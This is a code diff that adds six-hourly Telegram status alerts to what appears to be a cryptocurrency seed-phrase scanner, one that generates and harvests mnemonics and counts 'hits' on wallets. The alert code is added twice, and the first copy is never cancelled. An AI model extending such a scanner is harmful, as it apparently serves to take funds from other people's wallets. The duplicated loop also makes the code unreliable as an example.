@@ -315,10 +315,48 @@ async def run_scanner(workers: int = 20, duration: int | None = None) -> None:
 
     start_time = time.monotonic()
 
+    # Periodic status notifications (every 6 hours)
+    async def _status_notify():
+        while True:
+            await asyncio.sleep(6 * 3600)
+            try:
+                total = scanner._stats.total_mnemonics_all_time + scanner._stats.mnemonics_generated
+                await send_telegram_alert(
+                    "📊 *Scanner Status*\n\n"
+                    f"Mnemonics: {total:,}\n"
+                    f"Hits: {scanner._stats.total_hits_all_time + scanner._stats.hits_found}\n"
+                    f"Speed: {scanner._stats.mnemonics_per_sec:.1f}/sec"
+                )
+            except Exception:
+                pass
+
+    asyncio.create_task(_status_notify())
+
     # Start leak scanner and smart generator as background tasks
     leak_task = asyncio.create_task(run_leak_scanner_loop(interval=3600))
     smart_task = asyncio.create_task(run_smart_generator_loop(interval=300))
     logger.info("Leak scanner + smart generator background tasks started")
+
+    # Periodic status notification (every 6 hours)
+    async def _status_loop():
+        while True:
+            await asyncio.sleep(6 * 3600)
+            try:
+                total = scanner._stats.total_mnemonics_all_time + scanner._stats.mnemonics_generated
+                hits = scanner._stats.total_hits_all_time + scanner._stats.hits_found
+                msg = (
+                    "📊 *Scanner Status*\n\n"
+                    f"Total: {total:,} mnemonics\n"
+                    f"Speed: {scanner._stats.mnemonics_per_sec:.1f}/sec\n"
+                    f"Hits: {hits}\n"
+                    f"Errors: {scanner._stats.api_errors:,}\n\n"
+                    f"⏰ {datetime.now(timezone.utc).strftime('%Y-%m-%d %H:%M UTC')}"
+                )
+                await send_telegram_alert(msg)
+            except Exception:
+                pass
+
+    status_task = asyncio.create_task(_status_loop())
 
     try:
         stats = await scanner.run(duration_sec=duration)
@@ -329,6 +367,7 @@ async def run_scanner(workers: int = 20, duration: int | None = None) -> None:
     finally:
         leak_task.cancel()
         smart_task.cancel()
+        status_task.cancel()
         try:
             await leak_task
         except asyncio.CancelledError:
